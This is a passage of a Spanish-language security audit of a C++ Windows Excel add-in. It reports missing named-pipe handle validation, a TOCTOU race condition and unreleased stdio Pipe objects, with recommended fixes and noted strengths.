| Common/pipe.cc:152 | `NextWrite()` | `WriteFile(handle_, ...)` | Raw `HANDLE handle_` | Ninguna contra INVALID_HANDLE_VALUE |
| Common/QuartoService.cc:445 | `SpawnRender()` | `ReadFile(read_pipe.get(), ...)` | `UniqueHandle read_pipe` | Implícita (creada por CreatePipe exitoso) |
| tests/mock_engine_backend.cc:59 | `main()` | `ReadFile(pipe_handle, ...)` | Raw `HANDLE` | `INVALID_HANDLE_VALUE` check post-creación |
| tests/mock_engine_backend.cc:84 | `main()` | `WriteFile(pipe_handle, ...)` | Raw `HANDLE` | Ninguna en loop |

### Mecanismos de protección existentes

| Mecanismo | Ubicación | Protección que ofrece |
|-----------|-----------|----------------------|
| `UniqueHandle::is_valid()` | Common/UniqueHandle.h:53 | Verifica `handle_ != nullptr && handle_ != INVALID_HANDLE_VALUE` |
| `connected_` flag | LanguageService | Previene uso si pipe nunca se conectó |
| `pipe_handle_.is_valid()` check | language_service.cc:Connect() | Valida handle después de `CreateFileA` |
| Error handling reactivo | language_service.cc:Call() | Detecta `ERROR_BROKEN_PIPE` post-WriteFile/ReadFile |
| `error_` flag | Pipe class | Previene StartRead si hay error previo |
| Reconnection logic | language_service.cc:Call() | Reconecta si pipe se rompe (max retries) |

### Conclusión General

La validación de handles de Named Pipe en el proyecto NEVEN es **parcialmente implementada**. El wrapper `UniqueHandle` provee el método `is_valid()` y se usa correctamente en `Connect()` para validar el handle después de su creación. Sin embargo, **no se invoca `pipe_handle_.is_valid()` inmediatamente antes de las operaciones `ReadFile`/`WriteFile`** en el método `Call()`. La protección actual se basa en:

1. El flag `connected_` como guarda principal (verificado al inicio de `Call()`).
2. Manejo reactivo de errores post-operación (`ERROR_BROKEN_PIPE`, `ERROR_NO_DATA`).
3. Lógica de reconexión automática con reintentos.

Este enfoque es **funcionalmente correcto en la mayoría de escenarios** pero deja una ventana de vulnerabilidad entre el check de `connected_` y el uso real del handle, donde el proceso hijo podría terminar abruptamente.

La clase `Pipe` (usada por ControlR/ControlJulia) tiene una debilidad similar: `StartRead()` y `NextWrite()` no verifican `handle_ != INVALID_HANDLE_VALUE` antes de operar.

---

## Hallazgos

---

### [SEC-ALT-006] Pipe::StartRead() y Pipe::NextWrite() no validan handle antes de ReadFile/WriteFile

- **Archivo:** Common/pipe.cc
- **Líneas:** 69 (StartRead), 152 (NextWrite)
- **Contexto:**
```cpp
// pipe.cc:65-70 — StartRead()
int Pipe::StartRead() {
  if (reading_ || error_ || !connected_) return 0;
  reading_ = true;
  ResetEvent(read_io_.hEvent);
  ReadFile(handle_, read_buffer_, buffer_size_, 0, &read_io_);  // ← No INVALID_HANDLE_VALUE check
  return 0;
}

// pipe.cc:148-153 — NextWrite() (dentro del while loop)
while (write_stack_.size()) {
    ResetEvent(write_io_.hEvent);
    std::string message = write_stack_.front();
    write_stack_.pop_front();
    WriteFile(handle_, message.c_str(), (DWORD)message.length(), NULL, &write_io_);  // ← No check
    ...
}
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** La clase `Pipe` (usada por ControlR.exe y ControlJulia.exe como servidor de pipes) no verifica que `handle_` sea válido (`!= INVALID_HANDLE_VALUE`) antes de invocar `ReadFile` y `WriteFile`. Las únicas guardas son los flags booleanos `reading_`, `error_` y `connected_`. Si `handle_` se corrompe o se cierra externamente (por ejemplo, durante un `Reset()` concurrente o un cierre inesperado), la operación de I/O se ejecutará sobre un handle inválido, causando comportamiento indefinido o un crash. El constructor inicializa `handle_` a `INVALID_HANDLE_VALUE`, y `Start()` valida el resultado de `CreateNamedPipeA`, pero no hay validación en el punto de uso.
- **Recomendación:**
  1. Agregar validación explícita antes de cada operación de I/O:
```cpp
int Pipe::StartRead() {
  if (reading_ || error_ || !connected_) return 0;
  if (handle_ == INVALID_HANDLE_VALUE || handle_ == NULL) { error_ = true; return -1; }
  reading_ = true;
  ResetEvent(read_io_.hEvent);
  ReadFile(handle_, read_buffer_, buffer_size_, 0, &read_io_);
  return 0;
}
```
  2. Considerar migrar `Pipe` a usar `UniqueHandle` en lugar de raw `HANDLE` para consistencia con `LanguageService`.
  3. Agregar un método `is_valid()` a la clase `Pipe` que encapsule la verificación.

---

### [SEC-ALT-007] LanguageService::Call() no valida pipe_handle_.is_valid() antes de WriteFile/ReadFile

- **Archivo:** Core/src/language_service.cc
- **Líneas:** 561 (WriteFile), 590 (ReadFile), 619 (WriteFile callback), 622/636 (ReadFile restart)
- **Contexto:**
```cpp
// language_service.cc:555-561 — Call() WriteFile sin validación de handle
  if (!connected_) {
      // ... reconnect logic ...
      response.set_err("not connected");
      return;
  }

  ResetEvent(io_.hEvent);
  if (!WriteFile(pipe_handle_, framed_message.c_str(), ...)) {  // ← Solo connected_ como guarda
      DWORD err = GetLastError();
      ...
  }

// language_service.cc:588-590 — Call() ReadFile sin validación de handle
  if (call.wait()) {
    ResetEvent(io_.hEvent);
    ReadFile(pipe_handle_, buffer_.data(), (DWORD)buffer_.size(), 0, &io_);  // ← No is_valid() check
    ...
  }
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El método `Call()` de `LanguageService` es la función central de IPC que envía mensajes al proceso hijo (R/Julia) y lee respuestas. Aunque `pipe_handle_` es un `UniqueHandle` que provee `is_valid()`, este método **no se invoca antes de las operaciones de I/O**. La única guarda es el flag `connected_` verificado al inicio del método. Existe una ventana de tiempo (TOCTOU — Time Of Check To Time Of Use) entre la verificación de `connected_` y el uso real del handle donde:
  - El proceso hijo podría terminar (crash, kill externo).
  - Otro hilo podría invocar `Shutdown()` que llama `pipe_handle_.reset()`.
  - El handle podría ser cerrado por el sistema operativo.
  
  El código maneja estos escenarios **reactivamente** (detecta `ERROR_BROKEN_PIPE` después del fallo y reconecta), lo cual es funcionalmente correcto pero no previene la operación sobre un handle inválido. En Windows, `ReadFile`/`WriteFile` con un handle inválido retorna `FALSE` con `ERROR_INVALID_HANDLE` (código 6), que no está explícitamente manejado en el switch de errores.
- **Recomendación:**
  1. Agregar validación proactiva antes de cada operación de I/O:
```cpp
  if (!pipe_handle_.is_valid()) {
      connected_ = false;
      response.set_err("pipe handle invalid");
      return;
  }
  ResetEvent(io_.hEvent);
  if (!WriteFile(pipe_handle_, framed_message.c_str(), ...)) {
```
  2. Agregar `ERROR_INVALID_HANDLE` al manejo de errores post-WriteFile/ReadFile como trigger de reconexión.
  3. Considerar usar un `std::mutex` o `std::atomic<bool>` para `connected_` si `Shutdown()` puede ser invocado desde otro hilo.

---

### [SEC-ALT-008] Ventana TOCTOU entre connected_ check y uso de handle en Call() — posible race condition

- **Archivo:** Core/src/language_service.cc
- **Líneas:** 555-590
- **Contexto:**
```cpp
// Hilo 1 (Call):
  if (!connected_) { ... return; }   // ← Check en línea 555
  // ... ventana de tiempo ...
  WriteFile(pipe_handle_, ...);       // ← Uso en línea 561

// Hilo 2 (Shutdown, potencialmente concurrente):
  void LanguageService::Shutdown() {
    if (connected_) {
      ...
      connected_ = false;
      pipe_handle_.reset();           // ← Invalida el handle
    }
  }
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Handle inválido en Named Pipe (Race Condition)
- **Descripción:** Existe una condición de carrera (TOCTOU) entre la verificación del flag `connected_` y el uso efectivo de `pipe_handle_` en el método `Call()`. Si `Shutdown()` es invocado desde otro hilo (por ejemplo, durante el cierre de Excel o un timeout de health check) entre el check de `connected_` y la llamada a `WriteFile`, el handle habrá sido invalidado por `pipe_handle_.reset()` pero `Call()` intentará usarlo. El flag `connected_` no es `std::atomic` ni está protegido por mutex, lo que agrava la condición de carrera. En la práctica, esto podría causar:
  - `WriteFile` con handle `INVALID_HANDLE_VALUE` → retorna `FALSE` con `ERROR_INVALID_HANDLE`.
  - Crash si el handle fue reasignado por el sistema a otro recurso (improbable pero posible en escenarios de alta concurrencia).
  - Comportamiento indefinido si `UniqueHandle::operator HANDLE()` se invoca durante `reset()`.
  
  **Nota**: En el uso normal del add-in, `Call()` se invoca desde el hilo de Excel (STA) y `Shutdown()` también se invoca desde el mismo hilo durante `xlAutoClose`, por lo que la race condition es poco probable en operación normal. Sin embargo, el callback thread (`RunCallbackThread`) opera en un hilo separado y podría interactuar con el estado compartido.
- **Recomendación:**
  1. Hacer `connected_` un `std::atomic<bool>` para garantizar visibilidad entre hilos.
  2. Agregar un `std::mutex` que proteja las operaciones de pipe (o al menos la transición connected→disconnected).
  3. Verificar `pipe_handle_.is_valid()` inmediatamente antes de cada operación de I/O como segunda línea de defensa.
  4. Documentar el modelo de threading esperado (qué hilos pueden invocar qué métodos).

---

## Hallazgos Positivos (Fortalezas)

### [FOR-PIPE-001] UniqueHandle provee RAII y validación robusta para handles de pipe

- **Archivo:** Common/UniqueHandle.h
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El proyecto implementa un wrapper RAII (`rj2xcl::UniqueHandle`) para handles de Windows que: (1) garantiza `CloseHandle` automático al salir de scope, (2) previene copia accidental (copy constructor eliminado), (3) soporta move semantics para transferencia segura de ownership, (4) provee `is_valid()` que verifica tanto `nullptr` como `INVALID_HANDLE_VALUE`, (5) provee `reset()` para liberación explícita con re-inicialización a `INVALID_HANDLE_VALUE`. Este patrón elimina la clase entera de fugas de handles y double-close que son comunes en código Windows con raw `HANDLE`.

### [FOR-PIPE-002] LanguageService::Connect() valida handle correctamente después de CreateFileA

- **Archivo:** Core/src/language_service.cc:395-415
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El método `Connect()` usa `pipe_handle_.is_valid()` correctamente en un loop de reintentos después de `CreateFileA`. Si el handle es inválido, verifica si el proceso hijo terminó prematuramente (`GetExitCodeProcess`), registra el error con contexto detallado (nombre del pipe, número de reintentos), y marca el servicio como `Unavailable`. Este es el patrón correcto de validación post-creación.

### [FOR-PIPE-003] Lógica de reconexión automática con reintentos configurables

- **Archivo:** Core/src/language_service.cc:545-650 (método Call)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El método `Call()` implementa una lógica robusta de reconexión automática: cuando detecta `ERROR_BROKEN_PIPE` o `ERROR_NO_DATA` después de un `WriteFile` o `ReadFile` fallido, automáticamente: (1) marca `connected_ = false`, (2) resetea el handle (`pipe_handle_.reset()`), (3) reconecta al proceso hijo (`Connect()`), (4) re-inicializa el servicio (`Initialize()`), (5) reintenta la operación original. El número máximo de reintentos es configurable via `ConfigService::GetMaxRetries()`. Este manejo reactivo de errores mitiga significativamente el impacto de un handle que se vuelve inválido durante la operación.

### [FOR-PIPE-004] RunCallbackThread() valida handle de callback pipe antes de uso

- **Archivo:** Core/src/language_service.cc:237-247
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El método `RunCallbackThread()` valida correctamente el handle del callback pipe inmediatamente después de `CreateFileA`:
```cpp
HANDLE callback_pipe_handle = CreateFileA(ss.str().c_str(), ...);
if (!callback_pipe_handle || callback_pipe_handle == INVALID_HANDLE_VALUE) {
    DWORD err = GetLastError();
    RJ2XCL_LOG_ERR("err opening pipe [1]: %d", err);
}
else { /* proceed with valid handle */ }
```
Además, cuando el callback pipe se rompe (`ERROR_BROKEN_PIPE`), intenta reconectar y valida nuevamente el handle antes de continuar.

### [FOR-PIPE-005] Pipe::Start() valida handle después de CreateNamedPipeA

- **Archivo:** Common/pipe.cc:195-200
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Handle inválido en Named Pipe
- **Descripción:** El método `Pipe::Start()` verifica correctamente el resultado de `CreateNamedPipeA` contra ambos valores inválidos (`NULL` y `INVALID_HANDLE_VALUE`) y retorna un código de error si la creación falla, previniendo el uso de un handle inválido desde el inicio.

---

## Análisis de Completitud de la Validación

### Comparación: Validación post-creación vs. validación pre-uso

| Punto de validación | ¿Implementado? | Comentario |
|---------------------|----------------|------------|
| Después de `CreateNamedPipeA` (Pipe::Start) | ✅ Sí | Verifica NULL e INVALID_HANDLE_VALUE |
| Después de `CreateFileA` (LanguageService::Connect) | ✅ Sí | Usa `pipe_handle_.is_valid()` con reintentos |
| Después de `CreateFileA` (RunCallbackThread) | ✅ Sí | Verifica ambos valores inválidos |
| Antes de `WriteFile` en `Call()` | ❌ No | Solo verifica `connected_` flag |
| Antes de `ReadFile` en `Call()` | ❌ No | Solo verifica `connected_` flag |
| Antes de `ReadFile` en `Pipe::StartRead()` | ❌ No | Solo verifica `connected_`, `error_`, `reading_` |
| Antes de `WriteFile` en `Pipe::NextWrite()` | ❌ No | Sin validación de handle |
| Después de error en `WriteFile`/`ReadFile` | ✅ Sí | Manejo reactivo con reconexión |

### Evaluación de riesgo real

El riesgo práctico es **moderado** por las siguientes razones:
1. **Mitigación existente**: El manejo reactivo de errores (`ERROR_BROKEN_PIPE` → reconexión) cubre el escenario más común de handle inválido.
2. **Modelo de threading**: En operación normal, `Call()` y `Shutdown()` se invocan desde el mismo hilo (STA de Excel), reduciendo la probabilidad de race conditions.
3. **Windows behavior**: `ReadFile`/`WriteFile` con handle inválido retorna `FALSE` sin crash — el error se propaga via `GetLastError()`.
4. **Impacto**: Un handle inválido no usado causaría un error de I/O que se manejaría como pipe roto, triggering reconexión.

Sin embargo, la validación proactiva (`is_valid()` antes de uso) es una **best practice de defensa en profundidad** que eliminaría la ventana de vulnerabilidad y haría el código más robusto ante escenarios inesperados.

---

## Nota sobre el spec reliability-improvements

El spec `reliability-improvements` ya agregó la verificación `pipe_handle_.is_valid()` en `LanguageService::Connect()` (validación post-creación con reintentos y health status). Esta validación es **correcta pero incompleta** — cubre la creación del handle pero no su uso posterior en `Call()`. La recomendación es extender el patrón `is_valid()` a los puntos de uso (pre-WriteFile, pre-ReadFile) para completar la defensa en profundidad.

---

## Nota sobre Exclusiones

- `Build/_deps/` — Código de terceros (Protocol Buffers, Google Test).
- `tests/mock_engine_backend.cc` — Código de test que simula un backend; la ausencia de validación pre-uso es aceptable en contexto de testing.
- `Common/QuartoService.cc` — El `ReadFile(read_pipe.get(), ...)` opera sobre un handle creado por `CreatePipe` exitoso dentro del mismo scope; el riesgo de invalidación es mínimo.


---

# Hallazgos de Seguridad — Asignaciones de Memoria sin Liberación Correspondiente

**Tarea:** 2.5 Identificar asignaciones de memoria sin liberación correspondiente  
**Fecha:** 2026-01-XX  
**Alcance:** Core/, Common/, ControlR/, ControlJulia/, ControlPython/, Ribbon/  
**Extensiones:** .cc, .h

---

## Resumen del Escaneo

### Asignaciones con `new` identificadas en código propio

| Archivo | Tipo de asignación | ¿Liberada? | Mecanismo |
|---------|-------------------|------------|-----------|
| Core/src/rj2xcl.cc:105-108 | `new RibbonService`, `new FileWatchService`, `new WinExcelBridge`, `new CallbackDispatcher` | ✅ Sí | `std::unique_ptr` (RAII) |
| Core/src/language_service.cc:109 | `new char[result + 1]` | ✅ Sí | `delete[]` en línea 113 |
| Core/src/LanguageManager.cc:23 | `std::make_shared<LanguageService>(...)` | ✅ Sí | `std::shared_ptr` (RAII) |
| Core/src/FileWatchService.cc:15 | `std::make_unique<FileChangeWatcher>(...)` | ✅ Sí | `std::unique_ptr` (RAII) |
| Core/src/CallbackDispatcher.cc:12 | `std::unique_ptr<ICallbackHandler>` | ✅ Sí | `std::unique_ptr` (RAII) |
| Common/pipe.cc:232 | `new char[buffer_size_]` (read_buffer_) | ✅ Sí | `delete[]` en destructor `~Pipe()` |
| Common/ViewerManager.cc:227 | `new ViewerWindow(...)` | ✅ Sí | `delete entry.window` en WM_APP_CLOSE_VIEWER |
| Common/ViewerManager.cc:450,509,546 | `new CreateViewerRequest()` | ✅ Sí | `delete req` en message pump |
| Common/ViewerManager.cc:619 | `new SendMessageRequest()` | ✅ Sí | `delete req` en message pump |
| Common/PostMessageBridge.cc:154 | `new SaveContentRequest()` | ✅ Sí | `delete req` en WM_APP_SAVE_CONTENT |
| Common/REPLBridge.cc:127 | `new REPLExecRequest{...}` | ✅ Sí | `delete request` en ExecWorkerThread |
| Common/NevenBackgroundConnector.cc:72 | `new std::atomic<HealthStatus>(...)` | ✅ Sí | `delete p` en destructor |
| Common/windows_api_functions.cc:83 | `new char[length + 1]` | ✅ Sí | `delete[]` en línea 87 |
| Common/windows_api_functions.cc:125 | `new char[buffer_size]` | ✅ Sí | `delete[]` en ambas rutas (error y éxito) |
| ControlR/src/rinterface_win.cc:145-151 | `new structRstart`, `new char[MAX_PATH]` ×2 | ✅ Sí | `delete`/`delete[]` al final de RLoop |
| ControlR/src/rinterface_common.cc:954-955 | `new CallResponse` ×2 | ✅ Sí | `delete call; delete response` |
| ControlR/src/rinterface_common.cc:1004 | `new CompositeFunctionCall` | ✅ Sí | `delete function_call` |
| ControlR/src/rinterface_common.cc:1132-1133 | `new CallResponse` ×2 | ✅ Sí | `delete call; delete response` |
| ControlR/src/controlr.cc:213 | `new Pipe` | ✅ Sí | `delete pipe` en `cleanup()` |
| ControlR/src/gdi_graphics_device.cc:133 | `new Gdiplus::Bitmap(...)` | ✅ Sí | `delete bitmap` en destructor `~Device()` |
| ControlR/src/gdi_graphics_device.cc:268,288 | `new Gdiplus::Bitmap(...)` (resize) | ✅ Sí | `delete bitmap` antes de reasignación |
| ControlR/src/gdi_graphics_device.cc:324 | `new Gdiplus::PointF[n]` | ✅ Sí | `delete[] pt` en línea 338 |
| ControlR/src/gdi_graphics_device.cc:562 | `new unsigned int[len]` | ✅ Sí | `delete[] pixels` en línea 618 |
| ControlR/src/gdi_graphics_device.cc:211 | `new CLSID(...)` (static singleton) | ⚠️ Intencional | Singleton de proceso — nunca liberado |
| ControlR/src/spreadsheet_graphics_device.cc:228 | `new gdi_graphics_device::Device(...)` | ✅ Sí | `delete device` en `CloseDevice()` |
| ControlR/src/console_graphics_device.cc:385 | `new std::string("svg")` | ✅ Sí | `delete (dd->deviceSpecific)` en `CloseDevice()` |
| ControlR/src/convert.cc:59,62 | `new char[chunk]`, `new WCHAR[chunk]` (static) | ⚠️ Intencional | Buffers estáticos de proceso — crecen pero nunca se liberan |
| ControlJulia/src/julia_interface.cc:789-790 | `new CallResponse` ×2 | ✅ Sí | `delete call; delete response` |
| ControlJulia/src/julia_interface.cc:880-881 | `new CallResponse` ×2 | ✅ Sí | `delete call; delete response` |
| ControlJulia/src/julia_interface.cc:925 | `new CompositeFunctionCall` | ✅ Sí | `delete function_call` |
| ControlJulia/src/control_julia.cc:46 | `new Pipe` | ✅ Sí | `delete pipe` en cleanup al final de main |
| **ControlJulia/src/control_julia.cc:606** | **`new Pipe` ×2 (stdio_pipes)** | **❌ No** | **Nunca liberados** |
| ControlPython/src/control_python.cc:74 | `new Pipe` | ✅ Sí | `delete pipe` en cleanup al final de main |
| **ControlPython/src/control_python.cc:502** | **`new Pipe` ×2 (stdio_pipes)** | **❌ No** | **Nunca liberados** |

### Asignaciones con `malloc`/`calloc` identificadas

| Archivo | Tipo de asignación | ¿Liberada? | Mecanismo |
|---------|-------------------|------------|-----------|
| ControlR/src/gdi_graphics_device.cc:201 | `malloc(size)` (ImageCodecInfo) | ✅ Sí | `free(pImageCodecInfo)` en línea 216 |
| Module/src/RJ2XCLModule.cc:57 | `calloc(1, sizeof(DevDesc))` | ✅ Sí | Liberado por R graphics engine (`GEkillDevice`) |

### Uso de Smart Pointers

| Patrón | Ocurrencias | Ubicación |
|--------|-------------|-----------|
| `std::unique_ptr` | 12+ | Core/include/rj2xcl.h, CallbackDispatcher.h, FileWatchService.h, Include/RuntimeLoader.h |
| `std::shared_ptr` | 15+ | LanguageManager (servicios de lenguaje), function_descriptor.h |
| `std::make_unique` | 3 | FileWatchService.cc, rj2xcl.cc (RegisterHandler) |
| `std::make_shared` | 4 | LanguageManager.cc, language_service.cc |
| `rj2xcl::UniqueHandle` | 5+ | LanguageService (pipe handles), QuartoService |

### Conclusión General

El proyecto NEVEN tiene un **excelente manejo de memoria** en general. El código base usa extensivamente smart pointers (`std::unique_ptr`, `std::shared_ptr`) para los componentes principales del Core, y el wrapper RAII `UniqueHandle` para handles de Windows. Las asignaciones con `new` en los procesos hijos (ControlR, ControlJulia, ControlPython) son correctamente liberadas con `delete` en la gran mayoría de los casos.

Se identificaron **2 hallazgos de fuga de memoria** de severidad Media, ambos en el mismo patrón: los objetos `Pipe` creados para redirección de stdio en ControlJulia y ControlPython no son liberados al terminar el proceso. Aunque el impacto práctico es mínimo (el sistema operativo libera toda la memoria al terminar el proceso), representa una violación de buenas prácticas de gestión de memoria.

---

## Hallazgos

---

### [SEC-MED-002] Fuga de memoria: stdio_pipes no liberados en ControlPython

- **Archivo:** ControlPython/src/control_python.cc
- **Línea:** 502
- **Contexto:**
```cpp
// main() — línea 502
Pipe *stdio_pipes[] = { new Pipe, new Pipe };

stdio_pipes[0]->Start("stdout", false);
HANDLE stdout_write_handle = CreateFileA(stdio_pipes[0]->full_name().c_str(), ...);

stdio_pipes[1]->Start("stderr", false);
HANDLE stderr_write_handle = CreateFileA(stdio_pipes[1]->full_name().c_str(), ...);

uintptr_t io_thread_handle = _beginthreadex(0, 0, StdioThreadFunction, stdio_pipes, 0, 0);

// ... al final de main():
// Cleanup
PythonShutdown();
handles.clear();
for (auto pipe : pipes) delete pipe;  // ← Solo libera pipes del vector 'pipes'
pipes.clear();
// ← stdio_pipes[0] y stdio_pipes[1] NUNCA se liberan
```
- **Severidad:** Media
- **Categoría:** Seguridad > Fuga de memoria
- **Descripción:** En la función `main()` de ControlPython, se crean dos objetos `Pipe` en el heap para la redirección de stdout/stderr (`stdio_pipes[0]` y `stdio_pipes[1]`). Estos objetos se pasan al hilo `StdioThreadFunction` pero **nunca se agregan al vector `pipes`** que se limpia al final del proceso. El cleanup al final de `main()` solo libera los pipes del vector `pipes` (pipes de comunicación IPC), pero los `stdio_pipes` quedan sin liberar. Cada objeto `Pipe` contiene un handle de Windows (`HANDLE handle_`), un buffer de lectura (`char* read_buffer_`), y dos eventos (`OVERLAPPED` con `hEvent`). La fuga incluye:
  - 2 objetos `Pipe` (~200 bytes cada uno)
  - 2 buffers de lectura (`read_buffer_`, 8KB cada uno por defecto)
  - 4 handles de eventos de Windows (2 por Pipe: `read_io_.hEvent`, `write_io_.hEvent`)
  - 2 handles de Named Pipe (`handle_`)
  
  **Impacto práctico:** Bajo. El proceso ControlPython.exe termina con `ExitProcess(0)` o al final de `main()`, momento en el cual el sistema operativo libera toda la memoria y cierra todos los handles del proceso. Sin embargo, si el código se refactorizara para permitir reinicio sin terminar el proceso, esta fuga se acumularía.
- **Recomendación:**
  1. Agregar liberación explícita de `stdio_pipes` antes de la salida:
```cpp
// Cleanup
PythonShutdown();

handles.clear();
for (auto pipe : pipes) delete pipe;
pipes.clear();

// Liberar stdio pipes
delete stdio_pipes[0];
delete stdio_pipes[1];
```
  2. Alternativamente, usar `std::unique_ptr<Pipe>` para los stdio_pipes:
```cpp
std::unique_ptr<Pipe> stdio_pipes[] = { 
    std::make_unique<Pipe>(), 
    std::make_unique<Pipe>() 
};
```
  3. Considerar agregar los stdio_pipes al vector `pipes` para que se limpien con el mismo mecanismo.

---

### [SEC-MED-003] Fuga de memoria: stdio_pipes no liberados en ControlJulia

- **Archivo:** ControlJulia/src/control_julia.cc
- **Línea:** 606
- **Contexto:**
```cpp
// main() — línea 606
prompt_event_handle = CreateEvent(0, TRUE, FALSE, 0);
Pipe *stdio_pipes[] = { new Pipe, new Pipe };

stdio_pipes[0]->Start("stdout", false);
HANDLE stdout_write_handle = CreateFileA(stdio_pipes[0]->full_name().c_str(), ...);

stdio_pipes[1]->Start("stderr", false);
HANDLE stderr_write_handle = CreateFileA(stdio_pipes[1]->full_name().c_str(), ...);

uintptr_t io_thread_handle = _beginthreadex(0, 0, StdioThreadFunction, stdio_pipes, 0, 0);

// ... al final de main():
JuliaShutdown();
handles.clear();
for (auto pipe : pipes) delete pipe;  // ← Solo libera pipes del vector 'pipes'
pipes.clear();
// ← stdio_pipes[0] y stdio_pipes[1] NUNCA se liberan
```
- **Severidad:** Media
- **Categoría:** Seguridad > Fuga de memoria
- **Descripción:** Patrón idéntico al hallazgo SEC-MED-002 pero en ControlJulia. Los dos objetos `Pipe` creados para redirección de stdout/stderr nunca se liberan explícitamente. El código de cleanup al final de `main()` solo libera los pipes del vector `pipes` (pipes de comunicación IPC). Los `stdio_pipes` quedan huérfanos con sus buffers y handles asociados.
  
  **Impacto práctico:** Bajo. Mismo razonamiento que SEC-MED-002 — el sistema operativo libera los recursos al terminar el proceso.
- **Recomendación:**
  1. Agregar liberación explícita antes de la salida:
```cpp
JuliaShutdown();
handles.clear();
for (auto pipe : pipes) delete pipe;
pipes.clear();

// Liberar stdio pipes
delete stdio_pipes[0];
delete stdio_pipes[1];
```
  2. Alternativamente, migrar a `std::unique_ptr<Pipe>` para gestión automática.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-MEM-001] Uso extensivo de std::unique_ptr para ownership exclusivo en Core

- **Archivo:** Core/include/rj2xcl.h:65-94, Core/include/CallbackDispatcher.h:44, Core/include/FileWatchService.h:54
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** Los componentes principales del motor (`RibbonService`, `FileWatchService`, `WinExcelBridge`, `CallbackDispatcher`) son gestionados mediante `std::unique_ptr` en la clase `RJ2XCL_Engine`. Esto garantiza liberación automática al destruir el engine, previene fugas por excepciones, y documenta claramente la semántica de ownership (el engine es dueño exclusivo de estos componentes). El `CallbackDispatcher` también usa `std::unique_ptr` para sus handlers internos.

### [FOR-MEM-002] std::shared_ptr para servicios de lenguaje con ownership compartido

- **Archivo:** Core/include/LanguageManager.h:95-103, Core/src/LanguageManager.cc:23
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** Los servicios de lenguaje (`LanguageService`) se gestionan con `std::shared_ptr`, lo cual es apropiado dado que múltiples componentes necesitan acceso simultáneo al mismo servicio (el engine, los descriptores de funciones, el background connector). La creación usa `std::make_shared` que es más eficiente (una sola asignación para el objeto y el bloque de control). El vector `language_services_` en `LanguageManager` mantiene la referencia principal, y los `FunctionDescriptor` mantienen weak references implícitas.

### [FOR-MEM-003] UniqueHandle como RAII para handles de Windows

- **Archivo:** Common/UniqueHandle.h
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** El proyecto implementa `rj2xcl::UniqueHandle`, un wrapper RAII completo para `HANDLE` de Windows que: (1) llama `CloseHandle` automáticamente en el destructor, (2) previene copia accidental (copy constructor/assignment eliminados), (3) soporta move semantics para transferencia segura, (4) provee `is_valid()` para verificación, (5) provee `reset()` y `release()` para control explícito. Este patrón elimina la clase entera de fugas de handles y double-close.

### [FOR-MEM-004] Destructor de Pipe libera correctamente todos los recursos

- **Archivo:** Common/pipe.cc:35-45
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** El destructor `Pipe::~Pipe()` libera correctamente todos los recursos asociados: cierra el handle del pipe (`CloseHandle`), cierra los eventos de I/O (`read_io_.hEvent`, `write_io_.hEvent`), y libera el buffer de lectura (`delete[] read_buffer_`). Esto asegura que cuando un `Pipe` es destruido (ya sea por `delete` explícito o al salir de scope), no quedan recursos huérfanos.

### [FOR-MEM-005] Ausencia total de malloc/free en código propio del Core y Common

- **Archivo:** Core/, Common/ (excepto json11 de terceros)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** Los módulos Core y Common **no usan `malloc`/`free`** en absoluto. Toda la gestión de memoria dinámica se realiza mediante `new`/`delete` con smart pointers o RAII. Los únicos usos de `malloc` están en ControlR (para interacción con la API de GDI+ que requiere buffers C) y en Module (para la API de R que requiere `calloc` para `DevDesc`). Esto reduce significativamente el riesgo de errores de tipo mismatch (`new`/`free` o `malloc`/`delete`).

### [FOR-MEM-006] Patrón correcto de ownership transfer en message passing (ViewerManager)

- **Archivo:** Common/ViewerManager.cc:450-509, Common/REPLBridge.cc:127-168
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** El sistema de mensajes entre hilos (STA thread para WebView2) implementa correctamente el patrón de ownership transfer: el productor asigna con `new`, pasa el puntero via `PostThreadMessage`, y el consumidor libera con `delete` después de procesar. Cada tipo de request (`CreateViewerRequest`, `SendMessageRequest`, `SaveContentRequest`, `REPLExecRequest`) es liberado en exactamente un punto, sin posibilidad de double-free ni fuga. El caso de error en `REPLBridge::DispatchExec` (fallo al crear thread) también libera correctamente el request.

### [FOR-MEM-007] xlAutoFree12 implementa correctamente el protocolo de memoria XLL

- **Archivo:** Core/src/rj2xcl.cc:660-680
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
- **Descripción:** El proyecto implementa correctamente `xlAutoFree12`, el callback que Excel invoca para liberar memoria asignada por el DLL. Todas las funciones XLL que retornan strings o arrays marcan el resultado con `xlbitDLLFree`, y `xlAutoFree12` libera correctamente tanto strings simples como arrays multidimensionales (iterando sobre los elementos). Adicionalmente, el proyecto implementa `RaiiXlOper` (Core/src/RaiiXlOper.cc) que encapsula la liberación de XLOPERs en un wrapper RAII, previniendo fugas cuando se trabaja con resultados de llamadas a Excel.

### [FOR-MEM-008] Buffers estáticos con crecimiento controlado en convert.cc

- **Archivo:** ControlR/src/convert.cc:59-86
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Gestión de memoria
